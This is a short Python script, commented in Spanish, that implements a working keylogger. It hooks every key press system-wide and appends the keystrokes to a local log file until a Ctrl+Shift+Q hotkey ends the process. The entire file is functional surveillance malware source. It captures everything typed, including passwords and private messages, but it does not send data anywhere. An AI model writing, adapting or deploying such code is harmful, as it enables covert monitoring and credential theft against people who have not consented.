import keyboard
import subprocess
import time
import os
import signal

log_file = 'keyloggerLogs\keystrokes.txt'

def on_key_press(event):
    if keyboard.is_pressed('ctrl') and keyboard.is_pressed('shift') and keyboard.is_pressed('q'):
        os.kill(os.getpid(), signal.SIGTERM)  # Termina el proceso del keylogger
    else:
        with open(log_file, 'a') as f:
            if event.name == 'space':
                f.write(' ')
            elif event.name == 'tab':
                f.write('\t')
            elif event.name == 'enter':
                f.write('\n')
            else:
                f.write(event.name)

keyboard.on_press(on_key_press)

try:
    while True:
        time.sleep(0.1)  # Pequeña pausa para evitar el uso intensivo de la CPU
except KeyboardInterrupt:
    pass